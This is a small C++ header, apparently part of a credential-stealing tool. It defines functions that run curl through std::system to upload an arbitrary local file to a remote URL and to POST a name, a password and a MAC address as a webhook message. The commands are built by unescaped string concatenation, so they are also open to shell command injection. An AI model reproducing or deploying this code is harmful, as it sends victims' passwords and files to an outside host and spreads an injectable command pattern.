#pragma once

#include <cstdlib>
#include <string>

inline void webhook_file(const std::string& url, const std::string& path) {
    const std::string webhook_file_cmd = "curl -F x=@\"" + path + "\" " + url;
    std::system(webhook_file_cmd.c_str());
}

inline void webhook_message(const std::string& url,
        const std::string& gname,
        const std::string& gpass,
        const std::string& gmac) {
    const std::string webhook_msg_command =
            "curl -i -H \"Accept: application/json\" -H \"Content-Type:application/json\" -X POST --data \"{\\\"content\\\": \\\""
            + gname + ' ' + gpass + ' ' + gmac + "\\\"}\" " + url;
    std::system(webhook_msg_command.c_str());
}
